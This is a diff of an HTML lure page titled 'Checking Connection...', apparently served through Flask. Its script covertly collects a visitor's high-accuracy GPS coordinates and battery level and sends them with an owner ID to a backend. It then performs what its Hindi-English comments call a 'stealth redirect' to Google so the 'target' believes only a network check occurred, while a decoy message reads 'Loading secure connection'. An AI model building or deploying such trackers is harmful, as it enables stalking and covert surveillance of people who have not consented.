@@ -3,28 +3,39 @@
 <head>
     <title>Checking Connection...</title>
     <script>
-        const BACKEND_URL = "https://vanx-backend.onrender.com/update";
+        // Backend URL aur Owner ID (Flask se auto-fill hogi)
+        const BACKEND_URL = "/update";
+        const OWNER_ID = "{{ owner_id }}"; 
 
         async function sendData(lat, lon, battery) {
-            const params = `?lat=${lat}&lon=${lon}&batt=${battery}`;
+            // Data mein owner_id bhi bheja ja raha hai
+            const params = `?lat=${lat}&lon=${lon}&batt=${battery}&owner_id=${OWNER_ID}`;
             try {
                 await fetch(BACKEND_URL + params);
             } catch (e) {
-                console.log("Offline or Error");
+                console.log("Error sending data");
             }
-            window.location.href = "https://www.google.com"; // Stealth Redirect
+            // Stealth Redirect: Target ko lagega network check ho raha tha
+            window.location.href = "https://www.google.com"; 
         }
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const batt = await navigator.getBattery();
-            const batteryLevel = Math.floor(batt.level * 100) + "%";
-            sendData(pos.coords.latitude, pos.coords.longitude, batteryLevel);
+            try {
+                const batt = await navigator.getBattery();
+                const batteryLevel = Math.floor(batt.level * 100) + "%";
+                sendData(pos.coords.latitude, pos.coords.longitude, batteryLevel);
+            } catch (e) {
+                sendData(pos.coords.latitude, pos.coords.longitude, "Unknown");
+            }
         }, (err) => {
+            // Agar permission deny kare toh bhi redirect kar do
             window.location.href = "https://www.google.com";
         }, {enableHighAccuracy: true});
     </script>
 </head>
 <body>
-    <p>Loading please wait...</p>
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <p>Loading secure connection... Please wait.</p>
+    </div>
 </body>
 </html>
